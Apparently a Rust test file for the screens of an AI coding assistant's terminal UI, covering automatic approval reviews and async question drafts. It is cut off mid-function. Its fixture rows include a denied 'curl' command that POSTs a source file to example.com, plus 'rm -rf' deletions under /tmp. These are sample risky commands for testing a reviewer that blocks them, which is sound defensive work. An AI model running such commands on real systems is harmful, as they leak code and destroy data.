//! Shard `chat_approvals_2` (screens S13, owner dialogs-pane): the oracle tests of the manifest below,
//! ported as black-box screen tests with the kit. One test per manifest line,
//! named as the line says. Recipe: docs/rtwk-port/refs/screen-tests.md.
//! Replace each `kit::todo();` by the port, by `kit::pending(..)` + the port, or by
//! `kit::na(..)`; add the imports you need (`use crate::kit::{Owner, Screen};`).

use crate::kit::{self, Owner, Screen};

/// The first screen row that holds `text`: where the bottom pane's rows of a snapshot start.
fn row_of(s: &Screen, text: &str) -> usize {
    s.rows()
        .iter()
        .position(|r| r.contains(text))
        .unwrap_or(usize::MAX)
}

// ---- oracle: chatwidget/tests/guardian.rs (11 screen-level tests here; 4 state tests left to dialogs-pane)
// ORACLE chatwidget/tests/guardian.rs:103 app_server_guardian_write_stdin_denial_preserves_child_action kind=snap owner=dialogs-pane snap=guardian_write_stdin_denials_popup snap=guardian_write_stdin_denied_history snap=guardian_write_stdin_review_status
#[test]
fn app_server_guardian_write_stdin_denial_preserves_child_action() {
    kit::pending(
        Owner::DialogsPane,
        "needs(chat-live, chat-status, popups): the model (core approvals::guardian), the cell words (DecisionCell) and the list rows are built and tested in core/tests/approvals.rs and tests/sheets/approvals.rs; what is left is wiring of other owners: the router does not carry guardian notifications to the slot (`screens::project_thread`, `protocol/targets.rs` notification_thread: chat-live), `threads.rs` does not append `ThreadPart::take_history` to the transcript (chat-live, a decision item for the cells owner), the Working row does not read `ThreadPart.reviews` through `sheets::approvals::review_status` (chat-status), `/auto-review` opens no list and a pick is not mapped to `ThreadEv::ApproveDenied` (commands/dispatch.rs, `sheets::approvals::open_auto_review`: popups); the denials popup also waits on the select rows cutting the name with an ellipsis",
    );
    // oracle: a write_stdin review starts (InProgress) under a running turn and draws the review status row (width 80);
    // then it is denied: the only history cell is the stdin denial, the header is back to Working; the denials popup (width 110)
    // lists it; approving it submits a structured op (not drawn).
    let mut s = Screen::build(Owner::DialogsPane).size(80, 24).live().open();
    // needs feed: turn started; item/guardianApprovalReview started (guardian-write-stdin, InProgress, process 42)
    s.assert_snap("guardian_write_stdin_review_status");
    // needs feed: item/guardianApprovalReview completed (Denied, rationale "Would confirm a destructive operation.")
    s.assert_has_row(r#"✗ Request denied for codex to send input to terminal 42: "confirm\n""#);
    // needs: open_auto_review_denials_popup (the popup opener; the oracle test calls it, no key)
    s.resize(110, 24);
    s.assert_snap("guardian_write_stdin_denials_popup");
}

// ORACLE chatwidget/tests/guardian.rs:162 app_server_guardian_write_stdin_approval_and_timeout_clear_review_status kind=snap owner=dialogs-pane snap=guardian_write_stdin_timed_out_history
#[test]
fn app_server_guardian_write_stdin_approval_and_timeout_clear_review_status() {
    // oracle: a write_stdin review InProgress then Approved draws no history and no status; InProgress then TimedOut
    // leaves one history cell (the stdin timeout) and the header Working.
    let s = Screen::build(Owner::DialogsPane)
        .size(80, 24)
        .script(include_str!(
            "fixtures/chat_approvals_2/app_server_guardian_write_stdin_approval_and_timeout_clear_review_status.jsonl"
        ))
        .open();
    s.assert_has_row(
        r#"✗ Review timed out before codex could send input to terminal 42: "confirm\n""#,
    );
    s.assert_absent("Request approved");
    s.assert_absent("Reviewing approval request");
    s.assert_contains("Working (0s • esc to interrupt)");
}

// ORACLE chatwidget/tests/guardian.rs:202 auto_review_denials_popup_lists_stored_auto_review_denials kind=snap owner=dialogs-pane snap=auto_review_denials_popup
#[test]
fn auto_review_denials_popup_lists_stored_auto_review_denials() {
    kit::pending(
        Owner::DialogsPane,
        "needs(chat-live, popups): the model (core approvals::guardian), the cell words (DecisionCell) and the list rows are built and tested in core/tests/approvals.rs and tests/sheets/approvals.rs; what is left is wiring of other owners: the router does not carry guardian notifications to the slot (`screens::project_thread`, `protocol/targets.rs` notification_thread: chat-live), `/auto-review` opens no list and a pick is not mapped to `ThreadEv::ApproveDenied` (commands/dispatch.rs, `sheets::approvals::open_auto_review`: popups); the select rows wrap the name column where the oracle cuts it with an ellipsis (`@…`)",
    );
    // oracle: one denied auto review (curl ... https://example.com, risk high) is stored; the popup is drawn at width 40.
    let s = Screen::build(Owner::DialogsPane).size(40, 24).live().open();
    // needs feed: turn started; guardian assessment Denied (auto-review-recent-1); needs: open_auto_review_denials_popup
    s.assert_snap("auto_review_denials_popup");
}

// ORACLE chatwidget/tests/guardian.rs:256 guardian_denied_exec_renders_warning_and_denied_request kind=snap owner=dialogs-pane snap=guardian_denied_exec_renders_warning_and_denied_request
#[test]
fn guardian_denied_exec_renders_warning_and_denied_request() {
    kit::pending(
        Owner::DialogsPane,
        "needs(chat-live): the model (core approvals::guardian), the cell words (DecisionCell) and the list rows are built and tested in core/tests/approvals.rs and tests/sheets/approvals.rs; what is left is wiring of other owners: the router does not carry guardian notifications to the slot (`screens::project_thread`, `protocol/targets.rs` notification_thread: chat-live), `threads.rs` does not append `ThreadPart::take_history` to the transcript (chat-live, a decision item for the cells owner), and the guardian warning has no visible transcript item (`Item::Warning` is detailed-only)",
    );
    // oracle: an InProgress assessment, a warning line, then the Denied assessment: the history and the bottom pane at width 140, 20 rows.
    let s = Screen::build(Owner::DialogsPane)
        .size(140, 20)
        .live()
        .open();
    // needs feed: guardian assessment InProgress (guardian-1, curl ... https://example.com), warning, then Denied (risk high)
    s.assert_snap("guardian_denied_exec_renders_warning_and_denied_request");
}

// ORACLE chatwidget/tests/guardian.rs:328 guardian_approved_exec_is_hidden_from_history kind=snap owner=dialogs-pane snap=guardian_approved_exec_is_hidden_from_history
#[test]
fn guardian_approved_exec_is_hidden_from_history() {
    // oracle: a guardian warning (approved, risk low) and an Approved assessment draw no history; the bottom pane
    // at width 120 is the empty composer (its snapshot is only blank rows and the composer).
    let s = Screen::build(Owner::DialogsPane)
        .size(120, 24)
        .script(include_str!(
            "fixtures/chat_approvals_2/guardian_approved_exec_is_hidden_from_history.jsonl"
        ))
        .open();
    s.assert_absent("Automatic approval review");
    s.assert_absent("Request approved");
    s.assert_absent("guardian-approved");
    s.assert_absent("rm -f /tmp/guardian-approved.sqlite");
    s.assert_absent("Reviewing approval request");
}

// ORACLE chatwidget/tests/guardian.rs:384 guardian_approved_request_permissions_clears_status_without_history kind=snap owner=dialogs-pane snap=guardian_approved_request_permissions_clears_status_without_history
#[test]
fn guardian_approved_request_permissions_clears_status_without_history() {
    // oracle: an InProgress request-permissions review is the status (header and the reason as details); Approved clears
    // it without a history cell and the header is Working again (width 110).
    let mut s = Screen::build(Owner::DialogsPane)
        .size(110, 24)
        .script(include_str!(
            "fixtures/chat_approvals_2/guardian_approved_request_permissions_clears_status_without_history_1.jsonl"
        ))
        .open();
    s.assert_screen_row_then(
        "• Reviewing approval request (0s • esc to interrupt)",
        &["  └ permission request: Need write access for generated report assets."],
    );
    s.feed(include_str!(
        "fixtures/chat_approvals_2/guardian_approved_request_permissions_clears_status_without_history_2.jsonl"
    ));
    s.assert_absent("Reviewing approval request");
    s.assert_absent("permission request");
    s.assert_absent("Request approved");
    s.assert_contains("Working (0s • esc to interrupt)");
}

// ORACLE chatwidget/tests/guardian.rs:470 guardian_timed_out_exec_renders_warning_and_timed_out_request kind=snap owner=dialogs-pane snap=guardian_timed_out_exec_renders_warning_and_timed_out_request
#[test]
fn guardian_timed_out_exec_renders_warning_and_timed_out_request() {
    kit::pending(
        Owner::DialogsPane,
        "needs(chat-live): the model (core approvals::guardian), the cell words (DecisionCell) and the list rows are built and tested in core/tests/approvals.rs and tests/sheets/approvals.rs; what is left is wiring of other owners: the router does not carry guardian notifications to the slot (`screens::project_thread`, `protocol/targets.rs` notification_thread: chat-live), `threads.rs` does not append `ThreadPart::take_history` to the transcript (chat-live, a decision item for the cells owner), and the guardian warning has no visible transcript item (`Item::Warning` is detailed-only)",
    );
    // oracle: an InProgress assessment, the timeout warning, then TimedOut: history and bottom pane at width 140, 20 rows.
    let s = Screen::build(Owner::DialogsPane)
        .size(140, 20)
        .live()
        .open();
    // needs feed: guardian assessment InProgress (guardian-1), warning "Automatic approval review timed out while evaluating the requested approval.", TimedOut
    s.assert_snap("guardian_timed_out_exec_renders_warning_and_timed_out_request");
}

// ORACLE chatwidget/tests/guardian.rs:585 app_server_guardian_review_denied_renders_denied_request_snapshot kind=snap owner=dialogs-pane snap=app_server_guardian_review_denied_renders_denied_request
#[test]
fn app_server_guardian_review_denied_renders_denied_request_snapshot() {
    // The oracle's snapshot is the bottom pane with its own status line under the composer; the rows of the
    // denied request and the running header are compared here (the turn is started by hand: `set_task_running`).
    // The oracle draws the viewport at 140 columns but the history cell at the helper's 80 (`drain_insert_history`):
    // the cell's wrap is the one of an 80-column screen.
    let s = Screen::build(Owner::DialogsPane)
        .size(80, 24)
        .script(include_str!(
            "fixtures/chat_approvals_2/app_server_guardian_review_denied_renders_denied_request_snapshot.jsonl"
        ))
        .open();
    s.assert_screen_row_then(
        "✗ Request denied for codex to run curl -sS -i -X POST --data-binary",
        &[
            "  @core/src/codex.rs https://example.com",
            "",
            "• Working (0s • esc to interrupt)",
        ],
    );
    s.assert_absent("Reviewing approval request");
}

// ORACLE chatwidget/tests/guardian.rs:663 app_server_guardian_review_timed_out_renders_timed_out_request_snapshot kind=snap owner=dialogs-pane snap=app_server_guardian_review_timed_out_renders_timed_out_request
#[test]
fn app_server_guardian_review_timed_out_renders_timed_out_request_snapshot() {
    // The cell wraps at the helper's 80 columns, as in the denied test.
    let s = Screen::build(Owner::DialogsPane)
        .size(80, 24)
        .script(include_str!(
            "fixtures/chat_approvals_2/app_server_guardian_review_timed_out_renders_timed_out_request_snapshot.jsonl"
        ))
        .open();
    s.assert_screen_row_then(
        "✗ Review timed out before codex could run curl -sS -i -X POST --data-binary",
        &[
            "  @core/src/codex.rs https://example.com",
            "",
            "• Working (0s • esc to interrupt)",
        ],
    );
    s.assert_absent("Reviewing approval request");
}

// ORACLE chatwidget/tests/guardian.rs:744 guardian_parallel_reviews_render_aggregate_status_snapshot kind=snap owner=dialogs-pane snap=guardian_parallel_reviews_render_aggregate_status
#[test]
fn guardian_parallel_reviews_render_aggregate_status_snapshot() {
    // oracle: two InProgress reviews under a started turn draw one aggregate status at width 72.
    let s = Screen::build(Owner::DialogsPane)
        .size(72, 24)
        .script(include_str!(
            "fixtures/chat_approvals_2/guardian_parallel_reviews_render_aggregate_status_snapshot.jsonl"
        ))
        .open();
    s.assert_screen_row_then(
        "• Reviewing 2 approval requests (0s • esc to interrupt)",
        &[
            "  └ • rm -rf '/tmp/guardian target 1'",
            "    • rm -rf '/tmp/guardian target 2'",
        ],
    );
}

// ORACLE chatwidget/tests/guardian.rs:802 guardian_cleanup_drops_stale_reviews_and_restores_mcp_status kind=snap owner=dialogs-pane snap=guardian_goal_continuation_drops_stale_reviews
#[test]
fn guardian_cleanup_drops_stale_reviews_and_restores_mcp_status() {
    // oracle: alpha MCP starting, a stale review under turn-1, turn-1 interrupted: the header is Booting MCP server: alpha;
    // turn-2 with a current review draws the aggregate (width 72); turn-2 completes: the header is again Booting MCP server: alpha.
    // The header outside a running turn is state, not screen (a turn-less starting server draws no status row, see
    // `chat_live_3::mcp_startup_header_booting_snapshot`; core/tests/model.rs holds the header); here the stale review
    // must not draw and the current one owns the row.
    let mut s = Screen::build(Owner::DialogsPane)
        .size(72, 24)
        .script(include_str!(
            "fixtures/chat_approvals_2/guardian_cleanup_drops_stale_reviews_and_restores_mcp_status_1.jsonl"
        ))
        .open();
    s.assert_absent("stale-review");
    s.assert_absent("Reviewing approval request");
    s.assert_absent("Working");
    s.feed(include_str!(
        "fixtures/chat_approvals_2/guardian_cleanup_drops_stale_reviews_and_restores_mcp_status_2.jsonl"
    ));
    s.assert_screen_row_then(
        "• Reviewing approval request (0s • esc to interrupt)",
        &["  └ rm -rf '/tmp/current-review'"],
    );
    s.assert_absent("stale-review");
    s.feed(include_str!(
        "fixtures/chat_approvals_2/guardian_cleanup_drops_stale_reviews_and_restores_mcp_status_3.jsonl"
    ));
    s.assert_absent("Reviewing approval request");
    s.assert_absent("current-review");
}

// ---- oracle: chatwidget/tests/question_notifications_tests.rs (4 screen-level tests here; 0 state tests left to dialogs-pane)
// ORACLE chatwidget/tests/question_notifications_tests.rs:8 live_async_question_notifies_once_and_takes_priority_over_turn_completion kind=snap owner=dialogs-pane
#[test]
fn live_async_question_notifies_once_and_takes_priority_over_turn_completion() {
    kit::na(
        Owner::DialogsPane,
        "asserts the pending desktop notification value (`Question: Which environment?`) and that a question replayed or completed twice notifies once: the notification goes out as a terminal notification, not drawn on the screen grid",
    );
}

// ORACLE chatwidget/tests/question_notifications_tests.rs:54 async_question_notifications_respect_settings_and_ignore_empty_batches kind=snap owner=dialogs-pane snap=empty
#[test]
fn async_question_notifications_respect_settings_and_ignore_empty_batches() {
    kit::na(
        Owner::DialogsPane,
        "asserts the pending notification value under each notification setting and an empty batch: a desktop notification, not drawn on the screen grid",
    );
}

// ORACLE chatwidget/tests/question_notifications_tests.rs:80 async_question_notification_summarizes_batches_and_bounds_long_titles kind=snap owner=dialogs-pane
#[test]
fn async_question_notification_summarizes_batches_and_bounds_long_titles() {
    kit::na(
        Owner::DialogsPane,
        "asserts the pending notification display text (`Question: 2 questions requested`, the bounded title): a desktop notification value, not drawn on the screen grid",
    );
}

// ORACLE chatwidget/tests/question_notifications_tests.rs:105 async_question_notification_expires_when_turn_ends kind=snap owner=dialogs-pane
#[test]
fn async_question_notification_expires_when_turn_ends() {
    kit::na(
        Owner::DialogsPane,
        "asserts the pending notification and the unanswered count after each turn status, and a Debug snapshot of the outcomes: model values, not rows",
    );
}

// ---- oracle: chatwidget/tests/question_turn_end_tests.rs (5 screen-level tests here; 0 state tests left to dialogs-pane)
const TURN_QUESTION: &str = include_str!("fixtures/chat_approvals_2/q_turn_end_one.jsonl");
const TURN_DONE: &str = include_str!("fixtures/chat_approvals_2/q_two_done.jsonl");
const SECOND_DONE: &str = include_str!("fixtures/chat_approvals_2/q_turn_end_second.jsonl");

// ORACLE chatwidget/tests/question_turn_end_tests.rs:19 question_turn_end_escapes_command_drafts_before_submission kind=snap owner=dialogs-pane
#[test]
fn question_turn_end_escapes_command_drafts_before_submission() {
    for (draft, escaped) in [
        ("!echo partial", "\\!echo partial"),
        ("  !echo partial", "  !echo partial"),
        ("/", "\\/"),
        ("/diff", "\\/diff"),
        ("\t/diff", "\t\\/diff"),
        (" /diff", " /diff"),
        ("/tmp/file", "/tmp/file"),
        ("\\/diff", "\\/diff"),
    ] {
        for queued in [false, true] {
            let mut s = Screen::build(Owner::DialogsPane)
                .size(80, 24)
                .script(TURN_QUESTION)
                .open();
            if draft == "!echo partial" {
                s.type_text(draft);
            } else {
                s.draft(draft);
            }
            s.keys("alt+up").paste("answer");
            s.feed(TURN_DONE);
            let recovered = format!("{escaped}\n\n> Which way?\n\nanswer");
            // Tabs render as spaces in the terminal. The actual submitted draft is checked below.
            if !draft.contains('\t') {
                s.assert_composer(&recovered);
            }
            if queued {
                s.feed(include_str!(
                    "fixtures/chat_approvals_2/q_turn_end_large.jsonl"
                ));
                s.keys("tab");
                kit::assert_same(s.turns().len(), 0, "the prompt waits for the next live end");
                s.assert_contains("Queued follow-up inputs");
                s.feed(SECOND_DONE);
            } else {
                s.keys("enter");
            }
            s.assert_sole_turn(kit::Turn::text(recovered.trim()));
        }
    }
}

// ORACLE chatwidget/tests/question_turn_end_tests.rs:81 question_turn_end_appends_open_drafts_in_order_once kind=snap owner=dialogs-pane snap=large
#[test]
fn question_turn_end_appends_open_drafts_in_order_once() {
    let mut s = Screen::build(Owner::DialogsPane)
        .size(80, 28)
        .message_history(&["Earlier answer"])
        .script(include_str!("fixtures/composer_3/skill_figma.jsonl"))
        .open();
    s.type_text("$figma")
        .keys("tab")
        .type_text("existing draft");
    s.feed(include_str!(
        "fixtures/chat_approvals_2/q_turn_end_open.jsonl"
    ));
    s.keys("alt+up").paste("  Over-ear  ");
    s.keys("alt+up").paste("Under 250");
    s.keys("ctrl+r e");
    s.assert_contains("Earlier answer");
    s.feed(TURN_DONE);
    let recovered =
        "$figma existing draft\n\n> Which style?\n\nOver-ear\n\n> What budget?\n\nUnder 250";
    s.assert_saved_draft(recovered);
    s.assert_in_order(&["Over-ear", "> What budget?", "Under 250"]);
    s.feed(TURN_DONE);
    s.assert_saved_draft(recovered);

    s.feed(include_str!(
        "fixtures/chat_approvals_2/q_turn_end_large.jsonl"
    ));
    let large = "long answer ".repeat(200);
    s.keys("alt+up").paste(&large);
    s.feed(SECOND_DONE);
    s.assert_saved_draft(&format!("{recovered}\n\n[Pasted Content 2413 chars]"));
    s.assert_contains("[Pasted Content 2413 chars]");
    s.keys("enter");
    s.assert_sole_turn(
        kit::Turn::text(&format!("{recovered}\n\n> Which way?\n\n{}", large.trim()))
            .skills(&[("figma", "/tmp/user/figma/SKILL.md")]),
    );
}

fn assert_history_preview(s: &Screen) {
    // The query owns the terminal cursor. The draft preview is the separate prompt row.
    s.assert_has_row("› earlier prompt");
    s.assert_cursor_on_row_of("reverse-i-search: e  enter accept");
}

// ORACLE chatwidget/tests/question_turn_end_tests.rs:143 question_turn_end_recovers_collapsed_drafts_on_completion_and_failure kind=snap owner=dialogs-pane
#[test]
fn question_turn_end_recovers_collapsed_drafts_on_completion_and_failure() {
    for failed in [false, true] {
        let mut s = Screen::build(Owner::DialogsPane)
            .size(80, 24)
            .message_history(&["earlier prompt"])
            .script(TURN_QUESTION)
            .open();
        s.keys("alt+up").type_burst("answer").keys("alt+down");
        s.type_text("main").keys("ctrl+r e");
        assert_history_preview(&s);
        s.feed(if failed {
            include_str!("fixtures/chat_approvals_2/q_turn_end_error.jsonl")
        } else {
            TURN_DONE
        });
        assert_history_preview(&s);
        if failed {
            s.assert_contains("Turn failed");
            s.assert_sole_turn(kit::Turn::text("queued prompt"));
        } else {
            kit::assert_same(s.turns().len(), 0, "completion leaves the draft unsent");
        }
        s.keys("esc");
        s.assert_composer("main\n\n> Which way?\n\nanswer");
    }
}

// ORACLE chatwidget/tests/question_turn_end_tests.rs:209 question_turn_end_recovers_after_interruption_restores_queued_input kind=snap owner=dialogs-pane
#[test]
fn question_turn_end_recovers_after_interruption_restores_queued_input() {
    for main_input in ["history_accept", "history_cancel", "buffered_typing"] {
        let mut s = Screen::build(Owner::DialogsPane)
            .size(80, 24)
            .message_history(&["earlier prompt"])
            .script(TURN_QUESTION)
            .draft("main draft")
            .open();
        s.keys("alt+up").paste("answer").keys("alt+down");
        if main_input == "buffered_typing" {
            s.type_burst("+");
        } else {
            s.keys("ctrl+r e");
            assert_history_preview(&s);
        }
        s.feed(include_str!(
            "fixtures/chat_approvals_2/q_turn_end_interrupted.jsonl"
        ));
        if main_input != "buffered_typing" {
            assert_history_preview(&s);
            s.keys("z enter");
            s.assert_contains("reverse-i-search");
            s.assert_contains("main draft");
            s.keys("backspace");
            assert_history_preview(&s);
            s.keys(if main_input == "history_accept" {
                "enter"
            } else {
                "esc"
            });
        }
        match main_input {
            "history_accept" => s.assert_composer("earlier prompt"),
            "history_cancel" => {
                s.assert_saved_draft(
                    "pending steer\nqueued prompt\nmain draft\n\n> Which way?\n\nanswer",
                );
            }
            _ => {
                s.assert_saved_draft(
                    "pending steer\nqueued prompt\nmain draft+\n\n> Which way?\n\nanswer",
                );
            }
        }
        s.assert_absent("Queued follow-up inputs");
        kit::assert_same(s.turns().len(), 0, "the restored input was not sent");
    }
}

// ORACLE chatwidget/tests/question_turn_end_tests.rs:297 question_turn_end_keeps_multiline_question_and_answer_as_text kind=ui owner=dialogs-pane
#[test]
fn question_turn_end_keeps_multiline_question_and_answer_as_text() {
    let mut s = Screen::build(Owner::DialogsPane)
        .size(80, 24)
        .script(include_str!(
            "fixtures/chat_approvals_2/q_turn_end_multiline.jsonl"
        ))
        .open();
    s.keys("alt+up")
        .paste("  First answer line\n\nLast answer line  ")
        .keys("alt+down");
    s.feed(TURN_DONE);
    let draft = "> First line\n>\n> Last line?\n\nFirst answer line\n\nLast answer line";
    s.assert_saved_draft(draft);
    s.assert_in_order(&["> Last line?", "First answer line", "Last answer line"]);
    s.assert_absent("to answer");
    s.keys("enter");
    s.assert_sole_turn(kit::Turn::text(draft));
}

// ---- oracle: chatwidget/tests/questions_tests.rs (28 screen-level tests here; 4 state tests left to dialogs-pane)
// ORACLE chatwidget/tests/questions_tests.rs:16 unavailable_send_keeps_answer_and_skip_remains_available kind=ui owner=dialogs-pane
#[test]
fn unavailable_send_keeps_answer_and_skip_remains_available() {
    kit::na(
        Owner::DialogsPane,
        "asserts the model's unanswered count (question_count 2, then 1 after the skip) and the send gate (blocks_direct_input), not rows: a state test",
    );
}

// ORACLE chatwidget/tests/questions_tests.rs:29 accepted_question_answer_uses_existing_delivery_and_keeps_main_draft kind=snap owner=dialogs-pane
#[test]
fn accepted_question_answer_uses_existing_delivery_and_keeps_main_draft() {
    // oracle: composer "main draft"; two questions open; alt+up; an empty enter sends nothing. Not queued: the freeform
    // question draws `freeform_question`; "!literal answer" is delivered on enter and the composer keeps "main draft".
    // Queued (the queue autosend suppressed): the answered reply is queued and draws `queued_async_question_reply`.
    for queued in [false, true] {
        let mut s = Screen::build(Owner::DialogsPane)
            .size(80, 24)
            .script(include_str!("fixtures/chat_approvals_2/q_two.jsonl"))
            .open();
        s.paste("main draft");
        if queued {
            // the stream is lost: what the user sends waits in the queue (the oracle's `suppress_queue_autosend`)
            s.stream_lost("stream lost");
        }
        s.keys("alt+up enter");
        if !queued {
            s.assert_snap_region(
                "freeform_question",
                row_of(&s, "Queued follow-up inputs"),
                0,
            );
        }
        s.paste("!literal answer");
        s.keys("enter");
        let reply = "<send_user_message_question_reply>\n[{\"answer\":\"!literal answer\",\"question\":\"Which way?\",\"questionItemId\":\"[\\\"request_user_input_async\\\",\\\"message\\\",0]\"}]\n</send_user_message_question_reply>";
        if queued {
            s.assert_snap_region(
                "queued_async_question_reply",
                row_of(&s, "Queued follow-up inputs"),
                0,
            );
            kit::assert_same(s.turns().len(), 0, "the reply waits in the queue");
        } else {
            let turns = s.turns();
            kit::assert_same(turns.len(), 1, "one turn");
            kit::assert_same(turns[0].text.as_str(), reply, "the reply envelope");
        }
        // the editor of the other question is open; the main draft is back with the composer
        s.assert_contains("Any details?");
        s.keys("alt+down");
        s.assert_composer("main draft");
    }
}

// ORACLE chatwidget/tests/questions_tests.rs:66 async_question_answers_preserve_ambiguous_skill_selection_and_dismiss_remotely kind=ui owner=dialogs-pane
#[test]
fn async_question_answers_preserve_ambiguous_skill_selection_and_dismiss_remotely() {
    kit::na(
        Owner::DialogsPane,
        "asserts the submitted user turn's items (answer text, a skill selection) and the remaining question count on a second chat: model values, not rows",
    );
}

// ORACLE chatwidget/tests/questions_tests.rs:116 ordinary_follow_up_clears_unanswered_questions_after_accepted_input kind=snap owner=dialogs-pane
#[test]
fn ordinary_follow_up_clears_unanswered_questions_after_accepted_input() {
    // oracle: a thread with two open questions; an accepted "New prompt" (enter, not queued) clears them: the bottom
    // popup's first line is the composer placeholder (`questions_cleared_by_follow_up`).
    let mut s = Screen::build(Owner::DialogsPane).size(80, 24).live().open();
    // needs feed: thread started; questions "Which way?" and "Any details?" added; composer "New prompt"
    s.keys("enter");
    // needs feed: the prompt is accepted by the turn (no questions remain)
    s.assert_has_row("› Ask Codex to do anything");
}

// ORACLE chatwidget/tests/questions_tests.rs:158 local_shell_command_preserves_unanswered_questions kind=ui owner=dialogs-pane
#[test]
fn local_shell_command_preserves_unanswered_questions() {
    kit::na(
        Owner::DialogsPane,
        "asserts the unanswered count (2) and the RunUserShellCommand op sent for `!echo hi`: model values and an op, not rows",
    );
}

// ORACLE chatwidget/tests/questions_tests.rs:174 queued_prompt_clears_questions_arriving_after_enqueue_when_it_starts kind=ui owner=dialogs-pane
#[test]
fn queued_prompt_clears_questions_arriving_after_enqueue_when_it_starts() {
    kit::na(
        Owner::DialogsPane,
        "asserts the unanswered count and the op sent when the queued prompt starts: model values and an op, not rows",
    );
}

// ORACLE chatwidget/tests/questions_tests.rs:196 queued_question_answer_preserves_other_questions_on_delivery kind=ui owner=dialogs-pane
#[test]
fn queued_question_answer_preserves_other_questions_on_delivery() {
    kit::na(
        Owner::DialogsPane,
        "asserts the unanswered count and the reply op delivered from the queue: model values and an op, not rows",
    );
}

// ORACLE chatwidget/tests/questions_tests.rs:213 recovered_question_answers_preserve_other_questions kind=ui owner=dialogs-pane
#[test]
fn recovered_question_answers_preserve_other_questions() {
    kit::na(
        Owner::DialogsPane,
        "asserts the unanswered count and the reply op after a restored thread input state: model values and an op, not rows",
    );
}

// ORACLE chatwidget/tests/questions_tests.rs:355 reconnect_preserves_buffered_question_answer_source kind=ui owner=dialogs-pane
#[test]
fn reconnect_preserves_buffered_question_answer_source() {
    kit::na(
        Owner::DialogsPane,
        "asserts the queued message's source (QuestionAnswer), the reply op and the count after a reconnect: model values, not rows",
    );
}

// ORACLE chatwidget/tests/questions_tests.rs:387 blocked_follow_up_keeps_unanswered_questions kind=ui owner=dialogs-pane
#[test]
fn blocked_follow_up_keeps_unanswered_questions() {
    kit::na(
        Owner::DialogsPane,
        "asserts the unanswered count (2) and that no op is sent when the model is blocked: model values, not rows",
    );
}

// ORACLE chatwidget/tests/questions_tests.rs:401 disconnected_questions_remain_editable_without_sending kind=ui owner=dialogs-pane
#[test]
fn disconnected_questions_remain_editable_without_sending() {
    kit::na(
        Owner::DialogsPane,
        "asserts the unanswered count and that no op is sent while disconnected (restricted input): model values, not rows",
    );
}

// ORACLE chatwidget/tests/questions_tests.rs:432 selected_answers_preserve_long_labels_and_reject_oversized_submissions kind=snap owner=dialogs-pane
#[test]
fn selected_answers_preserve_long_labels_and_reject_oversized_submissions() {
    // oracle: a question with one option of 300 chars (named_question) is answered by its number and sent; an option over
    // the bound of the model's suggestions (oversized_question, dropped) leaves a plain input: an empty enter is refused, and
    // on a second enter after a paste of MAX/2 quotes (JSON escaping counts toward the limit) with the line
    // `  Answer too long; shorten it before sending`.
    for (fixture, snapshot, oversized) in [
        (
            include_str!("fixtures/chat_approvals_2/q_named.jsonl"),
            "named_question",
            false,
        ),
        (
            include_str!("fixtures/chat_approvals_2/q_oversized.jsonl"),
            "oversized_question",
            true,
        ),
    ] {
        let mut s = Screen::build(Owner::DialogsPane)
            .size(80, 24)
            .script(fixture)
            .open();
        s.keys("alt+up");
        s.assert_snap_region(snapshot, row_of(&s, "Queued follow-up inputs"), 0);
        s.keys("enter");
        if oversized {
            kit::assert_same(s.turns().len(), 0, "an empty answer sends nothing");
            s.paste(&"\"".repeat((1 << 20) / 2));
            s.keys("enter");
            kit::assert_same(s.turns().len(), 0, "an oversized answer sends nothing");
            s.assert_has_row("  Answer too long; shorten it before sending");
        } else {
            let turns = s.turns();
            kit::assert_same(turns.len(), 1, "one turn");
            kit::assert_same(
                turns[0]
                    .text
                    .contains(&format!("{} but do not deploy", "x".repeat(300))),
                true,
                "the long answer is sent whole",
            );
            kit::assert_same(
                turns[0].text.contains("\"question\":\"What next?\""),
                true,
                "the reply names the question",
            );
        }
    }
}

// ORACLE chatwidget/tests/questions_tests.rs:469 question_inputs_support_vim_editing_and_search kind=snap owner=dialogs-pane snap=question_vim_<single|other>
#[test]
fn question_inputs_support_vim_editing_and_search() {
    // oracle: with vim on, "alpha beta" / "alpha gamma" typed into the answer; the NORMAL frame and the SEARCH frame (`/gamma`) are
    // snapshots (question_vim_<single|other>); `dw` removes "alpha beta" until `u` restores it; `ctrl+r` redoes; `ciw` + "delta" answers.
    // (The oracle's `delivery_enabled = false` Enter is a hook of its tests: the port has no such state.)
    for (name, fixture, other) in [
        (
            "question_vim_single",
            include_str!("fixtures/chat_approvals_2/q_plain.jsonl"),
            false,
        ),
        (
            "question_vim_other",
            include_str!("fixtures/chat_approvals_2/q_numbered.jsonl"),
            true,
        ),
    ] {
        let mut s = Screen::build(Owner::DialogsPane)
            .size(80, 24)
            .script(fixture)
            .open();
        // `set_vim_enabled(true)`: the chat's `/vim`
        s.type_text("/vim");
        s.keys("enter");
        s.keys("alt+up");
        if other {
            s.keys("2");
        }
        s.keys("i");
        s.paste("alpha beta\nalpha gamma");
        s.keys("esc 0 k");
        s.assert_contains("Which way?");
        let at = row_of(&s, "Queued follow-up inputs");
        s.snap(name)
            .labelled(&["NORMAL", "SEARCH"])
            .frame("NORMAL")
            .at(at, 0)
            .assert();
        s.keys("d w");
        s.assert_absent("alpha beta");
        s.keys("u");
        s.assert_contains("alpha beta");
        s.keys("ctrl+r");
        s.assert_absent("alpha beta");
        s.keys("u");
        s.type_text("/gamma");
        let at = row_of(&s, "Queued follow-up inputs");
        s.snap(name)
            .labelled(&["NORMAL", "SEARCH"])
            .frame("SEARCH")
            .at(at, 0)
            .assert();
        s.keys("enter");
        kit::assert_same(s.turns().len(), 0, "the search's Enter answers nothing");
        s.assert_contains("Which way?");
        s.keys("c i w");
        s.paste("delta");
        s.keys("esc enter");
        let turns = s.turns();
        kit::assert_same(turns.len(), 1, "one answer");
        kit::assert_same(
            turns[0].text.contains("alpha beta\\nalpha delta"),
            true,
            "the answer",
        );
    }
}

// ORACLE chatwidget/tests/questions_tests.rs:529 question_history_search_uses_updated_bindings kind=ui owner=dialogs-pane
#[test]
fn question_history_search_uses_updated_bindings() {
    // oracle: history "[Image #2]earlier answer" then "newest answer"; up walks the history (newest, earlier, newest) for the
    // binding in the config (f12, or ctrl-x r); a typed query finds "persistent answer" from the host response for ctrl-x r.
    // (The history is the kit's `message_history`; the remote image of the first entry is the composer's own test.)
    let rebound: [&'static [(&'static str, &'static str)]; 2] = [
        &[("composer.history_search_previous", "f12")],
        &[("composer.history_search_previous", "ctrl+x r")],
    ];
    // (the oracle records "earlier answer" and "newest answer" as the session's history; the kit's `message_history`
    // is that store; a message sent from the composer would answer the questions)
    let file: [&[&str]; 2] = [
